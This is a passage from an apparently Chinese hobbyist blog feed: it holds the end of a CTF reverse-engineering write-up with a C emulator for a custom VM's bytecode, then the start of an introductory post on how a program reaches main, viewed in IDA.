0x9E发现十分熟悉，所以猜测出mem是opcode（后面我才知道可以看结构体的定义来猜测）</p><p>于是有了操作函数对应字节码，有opcode，就可以解密了，因为这个调用的函数相同并且都是opcode[i+0]做字节码，opcode[i+1,2,3]参与运算，并且函数固定，所以这个vm不是很难写</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> o[<span class="number">19457</span>] = &#123;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> main() &#123;</span><br><span class="line">    <span class="type">int</span> ax, bx, cx, dx;</span><br><span class="line">    <span class="type">int</span> abcdx[<span class="number">16</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> <span class="built_in">stack</span>[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">19444</span>; i += <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%x %x %x %x:&quot;</span>, o[i], o[i + <span class="number">1</span>], o[i + <span class="number">2</span>], o[i + <span class="number">3</span>]);</span><br><span class="line">        <span class="keyword">switch</span> (o[i]) &#123;</span><br><span class="line">            <span class="comment">//ldr</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x11</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;abcdx[%d] = %d //stack[%d]\n&quot;</span>, o[i + <span class="number">1</span>] &amp; <span class="number">0xf</span>, <span class="built_in">stack</span>[o[i + <span class="number">2</span>]], o[i + <span class="number">2</span>]);</span><br><span class="line">            abcdx[o[i + <span class="number">1</span>]] = <span class="built_in">stack</span>[o[i + <span class="number">2</span>]];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x13</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;abcdx[%d] = %d //stack[%d]\n&quot;</span>, o[i + <span class="number">1</span>] &amp; <span class="number">0xf</span>, <span class="built_in">stack</span>[o[i + <span class="number">2</span>]], o[i + <span class="number">2</span>]);</span><br><span class="line">            abcdx[o[i + <span class="number">1</span>]] = <span class="built_in">stack</span>[o[i + <span class="number">2</span>]];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">//ldri</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x12</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;------------------------------\n&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;abcdx[%d] = stack[%d]\n&quot;</span>, o[i + <span class="number">1</span>] &amp; <span class="number">0xf</span>, o[i + <span class="number">3</span>]);</span><br><span class="line">            abcdx[o[i + <span class="number">1</span>] &amp; <span class="number">0xf</span>] = <span class="built_in">stack</span>[o[i + <span class="number">3</span>]];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x14</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;------------------------------\n&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;abcdx[%d] = stack[%d]\n&quot;</span>, o[i + <span class="number">1</span>] &amp; <span class="number">0xf</span>, o[i + <span class="number">3</span>]);</span><br><span class="line">            abcdx[o[i + <span class="number">1</span>] &amp; <span class="number">0xf</span>] = <span class="built_in">stack</span>[o[i + <span class="number">3</span>]];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">//str</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x15</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;stack[%d] = %d //stack[%d]\n&quot;</span>, o[i + <span class="number">2</span>], abcdx[o[i + <span class="number">1</span>] &amp; <span class="number">0xf</span>], o[i + <span class="number">1</span>]);</span><br><span class="line">            <span class="built_in">stack</span>[o[i + <span class="number">2</span>]] = abcdx[o[i + <span class="number">1</span>] &amp; <span class="number">0xf</span>];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x17</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;stack[%d] = %d //stack[%d]\n&quot;</span>, o[i + <span class="number">2</span>], abcdx[o[i + <span class="number">1</span>] &amp; <span class="number">0xf</span>], o[i + <span class="number">1</span>]);</span><br><span class="line">            <span class="built_in">stack</span>[o[i + <span class="number">2</span>]] = abcdx[o[i + <span class="number">1</span>] &amp; <span class="number">0xf</span>];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">//stri</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x16</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;stack[%d] = %d //stack[%d]\n&quot;</span>, o[i + <span class="number">3</span>], abcdx[o[i + <span class="number">1</span>] &amp; <span class="number">0xf</span>], o[i + <span class="number">1</span>]);</span><br><span class="line">            <span class="built_in">stack</span>[o[i + <span class="number">3</span>]] = abcdx[o[i + <span class="number">1</span>] &amp; <span class="number">0xf</span>];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x18</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;stack[%d] = %d //stack[%d]\n&quot;</span>, o[i + <span class="number">3</span>], abcdx[o[i + <span class="number">1</span>] &amp; <span class="number">0xf</span>], o[i + <span class="number">1</span>]);</span><br><span class="line">            <span class="built_in">stack</span>[o[i + <span class="number">3</span>]] = abcdx[o[i + <span class="number">1</span>] &amp; <span class="number">0xf</span>];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">//mov</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x2A</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;abcdx[%d] = %x%x //&quot;</span>, o[i + <span class="number">1</span>], o[i + <span class="number">3</span>], o[i + <span class="number">2</span>]);</span><br><span class="line">            ax = o[i + <span class="number">2</span>];</span><br><span class="line">            ax += o[i + <span class="number">3</span>] &lt;&lt; <span class="number">8</span>;</span><br><span class="line">            abcdx[(o[i + <span class="number">1</span>]) &amp; <span class="number">0xf</span>] = ax;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%04x\n&quot;</span>, abcdx[(o[i + <span class="number">1</span>]) &amp; <span class="number">0xf</span>]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x2B</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;abcdx[%d] = %x%x //&quot;</span>, o[i + <span class="number">1</span>], o[i + <span class="number">3</span>], o[i + <span class="number">2</span>]);</span><br><span class="line">            ax = o[i + <span class="number">2</span>];</span><br><span class="line">            ax += o[i + <span class="number">3</span>] &lt;&lt; <span class="number">8</span>;</span><br><span class="line">            abcdx[(o[i + <span class="number">1</span>]) &amp; <span class="number">0xf</span>] = ax;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%04x\n&quot;</span>, abcdx[(o[i + <span class="number">1</span>]) &amp; <span class="number">0xf</span>]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">//add</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x91</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;abcdx[%d] = %d //%d + abcdx[%d]  &quot;</span>, o[i + <span class="number">1</span>] &amp; <span class="number">0xf</span>, o[i + <span class="number">2</span>] + abcdx[o[i + <span class="number">3</span>] &amp; <span class="number">0xf</span>], o[i + <span class="number">2</span>], o[i + <span class="number">3</span>] &amp; <span class="number">0xf</span>);</span><br><span class="line">            abcdx[(o[i + <span class="number">1</span>]) &amp; <span class="number">0xf</span>] = o[i + <span class="number">2</span>] + abcdx[(o[i + <span class="number">3</span>]) &amp; <span class="number">0xf</span>];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;abcdx[%d] = %d\n&quot;</span>, (o[i + <span class="number">1</span>]) &amp; <span class="number">0xf</span>, abcdx[(o[i + <span class="number">1</span>]) &amp; <span class="number">0xf</span>]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x41</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;abcdx[%d] = %d //%d + abcdx[%d]  &quot;</span>, o[i + <span class="number">1</span>] &amp; <span class="number">0xf</span>, o[i + <span class="number">2</span>] + abcdx[o[i + <span class="number">3</span>] &amp; <span class="number">0xf</span>], o[i + <span class="number">2</span>], o[i + <span class="number">3</span>] &amp; <span class="number">0xf</span>);</span><br><span class="line">            abcdx[(o[i + <span class="number">1</span>]) &amp; <span class="number">0xf</span>] = o[i + <span class="number">2</span>] + abcdx[(o[i + <span class="number">3</span>]) &amp; <span class="number">0xf</span>];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;abcdx[%d] = %d\n&quot;</span>, (o[i + <span class="number">1</span>]) &amp; <span class="number">0xf</span>, abcdx[(o[i + <span class="number">1</span>]) &amp; <span class="number">0xf</span>]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">//sub</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x42</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;abcdx[%d] = %d //%d - abcdx[%d]  &quot;</span>, o[i + <span class="number">1</span>] &amp; <span class="number">0xf</span>, o[i + <span class="number">2</span>] - abcdx[o[i + <span class="number">3</span>] &amp; <span class="number">0xf</span>], o[i + <span class="number">2</span>], o[i + <span class="number">3</span>] &amp; <span class="number">0xf</span>);</span><br><span class="line">            abcdx[(o[i + <span class="number">1</span>]) &amp; <span class="number">0xf</span>] = o[i + <span class="number">2</span>] + abcdx[(o[i + <span class="number">3</span>]) &amp; <span class="number">0xf</span>];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;abcdx[%d] = %d\n&quot;</span>, (o[i + <span class="number">1</span>]) &amp; <span class="number">0xf</span>, abcdx[(o[i + <span class="number">1</span>]) &amp; <span class="number">0xf</span>]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x92</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;abcdx[%d] = %d //%d - abcdx[%d]  &quot;</span>, o[i + <span class="number">1</span>] &amp; <span class="number">0xf</span>, o[i + <span class="number">2</span>] - abcdx[o[i + <span class="number">3</span>] &amp; <span class="number">0xf</span>], o[i + <span class="number">2</span>], o[i + <span class="number">3</span>] &amp; <span class="number">0xf</span>);</span><br><span class="line">            abcdx[(o[i + <span class="number">1</span>]) &amp; <span class="number">0xf</span>] = o[i + <span class="number">2</span>] + abcdx[(o[i + <span class="number">3</span>]) &amp; <span class="number">0xf</span>];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;abcdx[%d] = %d\n&quot;</span>, (o[i + <span class="number">1</span>]) &amp; <span class="number">0xf</span>, abcdx[(o[i + <span class="number">1</span>]) &amp; <span class="number">0xf</span>]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">//mul</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x47</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;abcdx[%d] = %d //%d * abcdx[%d]  &quot;</span>, o[i + <span class="number">1</span>] &amp; <span class="number">0xf</span>, o[i + <span class="number">2</span>] * abcdx[o[i + <span class="number">3</span>] &amp; <span class="number">0xf</span>], o[i + <span class="number">2</span>], o[i + <span class="number">3</span>] &amp; <span class="number">0xf</span>);</span><br><span class="line">            abcdx[(o[i + <span class="number">1</span>]) &amp; <span class="number">0xf</span>] = o[i + <span class="number">2</span>] + abcdx[(o[i + <span class="number">3</span>]) &amp; <span class="number">0xf</span>];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;abcdx[%d] = %d\n&quot;</span>, (o[i + <span class="number">1</span>]) &amp; <span class="number">0xf</span>, abcdx[(o[i + <span class="number">1</span>]) &amp; <span class="number">0xf</span>]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x97</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;abcdx[%d] = %d //%d * abcdx[%d]  &quot;</span>, o[i + <span class="number">1</span>] &amp; <span class="number">0xf</span>, o[i + <span class="number">2</span>] * abcdx[o[i + <span class="number">3</span>] &amp; <span class="number">0xf</span>], o[i + <span class="number">2</span>], o[i + <span class="number">3</span>] &amp; <span class="number">0xf</span>);</span><br><span class="line">            abcdx[(o[i + <span class="number">1</span>]) &amp; <span class="number">0xf</span>] = o[i + <span class="number">2</span>] + abcdx[(o[i + <span class="number">3</span>]) &amp; <span class="number">0xf</span>];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;abcdx[%d] = %d\n&quot;</span>, (o[i + <span class="number">1</span>]) &amp; <span class="number">0xf</span>, abcdx[(o[i + <span class="number">1</span>]) &amp; <span class="number">0xf</span>]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">//xor</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x7A</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;abcdx[%d] = %d //%d + abcdx[%d]  &quot;</span>, o[i + <span class="number">1</span>] &amp; <span class="number">0xf</span>, o[i + <span class="number">2</span>] ^ abcdx[o[i + <span class="number">3</span>] &amp; <span class="number">0xf</span>], o[i + <span class="number">2</span>], o[i + <span class="number">3</span>] &amp; <span class="number">0xf</span>);</span><br><span class="line">            abcdx[(o[i + <span class="number">1</span>]) &amp; <span class="number">0xf</span>] = o[i + <span class="number">2</span>] + abcdx[(o[i + <span class="number">3</span>]) &amp; <span class="number">0xf</span>];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;abcdx[%d] = %d\n&quot;</span>, (o[i + <span class="number">1</span>]) &amp; <span class="number">0xf</span>, abcdx[(o[i + <span class="number">1</span>]) &amp; <span class="number">0xf</span>]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xca</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;abcdx[%d] = %d //%d + abcdx[%d]  &quot;</span>, o[i + <span class="number">1</span>] &amp; <span class="number">0xf</span>, o[i + <span class="number">2</span>] ^ abcdx[o[i + <span class="number">3</span>] &amp; <span class="number">0xf</span>], o[i + <span class="number">2</span>], o[i + <span class="number">3</span>] &amp; <span class="number">0xf</span>);</span><br><span class="line">            abcdx[(o[i + <span class="number">1</span>]) &amp; <span class="number">0xf</span>] = o[i + <span class="number">2</span>] + abcdx[(o[i + <span class="number">3</span>]) &amp; <span class="number">0xf</span>];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;abcdx[%d] = %d\n&quot;</span>, (o[i + <span class="number">1</span>]) &amp; <span class="number">0xf</span>, abcdx[(o[i + <span class="number">1</span>]) &amp; <span class="number">0xf</span>]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">//lsl</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x71</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;abcdx[%d] = %d //%d &lt;&lt; abcdx[%d]  &quot;</span>, o[i + <span class="number">1</span>] &amp; <span class="number">0xf</span>, o[i + <span class="number">2</span>] &lt;&lt; abcdx[o[i + <span class="number">3</span>] &amp; <span class="number">0xf</span>], o[i + <span class="number">2</span>], o[i + <span class="number">3</span>] &amp; <span class="number">0xf</span>);</span><br><span class="line">            abcdx[(o[i + <span class="number">1</span>]) &amp; <span class="number">0xf</span>] = o[i + <span class="number">2</span>] + abcdx[(o[i + <span class="number">3</span>]) &amp; <span class="number">0xf</span>];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;abcdx[%d] = %d\n&quot;</span>, (o[i + <span class="number">1</span>]) &amp; <span class="number">0xf</span>, abcdx[(o[i + <span class="number">1</span>]) &amp; <span class="number">0xf</span>]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xc1</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;abcdx[%d] = %d //%d &lt;&lt; abcdx[%d]  &quot;</span>, o[i + <span class="number">1</span>] &amp; <span class="number">0xf</span>, o[i + <span class="number">2</span>] &lt;&lt; abcdx[o[i + <span class="number">3</span>] &amp; <span class="number">0xf</span>], o[i + <span class="number">2</span>], o[i + <span class="number">3</span>] &amp; <span class="number">0xf</span>);</span><br><span class="line">            abcdx[(o[i + <span class="number">1</span>]) &amp; <span class="number">0xf</span>] = o[i + <span class="number">2</span>] + abcdx[(o[i + <span class="number">3</span>]) &amp; <span class="number">0xf</span>];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;abcdx[%d] = %d\n&quot;</span>, (o[i + <span class="number">1</span>]) &amp; <span class="number">0xf</span>, abcdx[(o[i + <span class="number">1</span>]) &amp; <span class="number">0xf</span>]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">//lsr</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x73</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;abcdx[%d] = %d //%d &gt;&gt; abcdx[%d]  &quot;</span>, o[i + <span class="number">1</span>] &amp; <span class="number">0xf</span>, o[i + <span class="number">2</span>] &gt;&gt; abcdx[o[i + <span class="number">3</span>] &amp; <span class="number">0xf</span>], o[i + <span class="number">2</span>], o[i + <span class="number">3</span>] &amp; <span class="number">0xf</span>);</span><br><span class="line">            abcdx[(o[i + <span class="number">1</span>]) &amp; <span class="number">0xf</span>] = o[i + <span class="number">2</span>] + abcdx[(o[i + <span class="number">3</span>]) &amp; <span class="number">0xf</span>];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;abcdx[%d] = %d\n&quot;</span>, (o[i + <span class="number">1</span>]) &amp; <span class="number">0xf</span>, abcdx[(o[i + <span class="number">1</span>]) &amp; <span class="number">0xf</span>]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xc3</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;abcdx[%d] = %d //%d &gt;&gt; abcdx[%d]  &quot;</span>, o[i + <span class="number">1</span>] &amp; <span class="number">0xf</span>, o[i + <span class="number">2</span>] &gt;&gt; abcdx[o[i + <span class="number">3</span>] &amp; <span class="number">0xf</span>], o[i + <span class="number">2</span>], o[i + <span class="number">3</span>] &amp; <span class="number">0xf</span>);</span><br><span class="line">            abcdx[(o[i + <span class="number">1</span>]) &amp; <span class="number">0xf</span>] = o[i + <span class="number">2</span>] + abcdx[(o[i + <span class="number">3</span>]) &amp; <span class="number">0xf</span>];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;abcdx[%d] = %d\n&quot;</span>, (o[i + <span class="number">1</span>]) &amp; <span class="number">0xf</span>, abcdx[(o[i + <span class="number">1</span>]) &amp; <span class="number">0xf</span>]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">//and</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xcb</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;abcdx[%d] = %d //%d &amp; abcdx[%d]  &quot;</span>, o[i + <span class="number">1</span>] &amp; <span class="number">0xf</span>, o[i + <span class="number">2</span>] &amp; abcdx[o[i + <span class="number">3</span>] &amp; <span class="number">0xf</span>], o[i + <span class="number">2</span>], o[i + <span class="number">3</span>] &amp; <span class="number">0xf</span>);</span><br><span class="line">            abcdx[(o[i + <span class="number">1</span>]) &amp; <span class="number">0xf</span>] = o[i + <span class="number">2</span>] + abcdx[(o[i + <span class="number">3</span>]) &amp; <span class="number">0xf</span>];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;abcdx[%d] = %d\n&quot;</span>, (o[i + <span class="number">1</span>]) &amp; <span class="number">0xf</span>, abcdx[(o[i + <span class="number">1</span>]) &amp; <span class="number">0xf</span>]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x7B</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;abcdx[%d] = %d //%d &amp; abcdx[%d]  &quot;</span>, o[i + <span class="number">1</span>] &amp; <span class="number">0xf</span>, o[i + <span class="number">2</span>] &amp; abcdx[o[i + <span class="number">3</span>] &amp; <span class="number">0xf</span>], o[i + <span class="number">2</span>], o[i + <span class="number">3</span>] &amp; <span class="number">0xf</span>);</span><br><span class="line">            abcdx[(o[i + <span class="number">1</span>]) &amp; <span class="number">0xf</span>] = o[i + <span class="number">2</span>] + abcdx[(o[i + <span class="number">3</span>]) &amp; <span class="number">0xf</span>];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;abcdx[%d] = %d\n&quot;</span>, (o[i + <span class="number">1</span>]) &amp; <span class="number">0xf</span>, abcdx[(o[i + <span class="number">1</span>]) &amp; <span class="number">0xf</span>]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xff</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;hlt\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xfe</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ret\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, <span class="built_in">stack</span>[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, abcdx[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是这玩意太太太长了。。。懒得分析了，到此结束</p><p>。。。是xxtea。。。不做了</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>&#39;main&#39;</title>
      <link href="/2025/03/26/main/"/>
      <url>/2025/03/26/main/</url>
      
        <content type="html"><![CDATA[<p>致梦的开始</p><span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这篇文章是在第一学期快结束补充的，我不断地思索，哪个文章可以作为逆向启程呢，是ida的熟悉流程？是遇到最简单题目的题解？是c语言的小知识？亦或是其他，但我总认为，这些不足以为我的逆向开一个好头，思来想去最后决定以main函数来作为逆向的启蒙</p><h2 id="start"><a href="#start" class="headerlink" title="start"></a>start</h2><p>开始，也意味着程序的开始，一个用c语言写好了main的程序并不是直接从main开始的，而是start，start紧接着去调用很多函数，他最终的目的也是位main铺路</p><p>以一个最简单的程序为例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hallo re&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><pre><code>将这个程序生成的文件拖入ida</code></pre><h2 id="hello-re"><a href="#hello-re" class="headerlink" title="hello re"></a>hello re</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// attributes: thunk</span></span><br><span class="line">__int64 <span class="title function_">start</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> start_0();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><pre><code>反编译出的第一条是他，start，什么都没有，不过别急，点进去，连着点进去两个函数出现了第一个岔路</code></pre><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 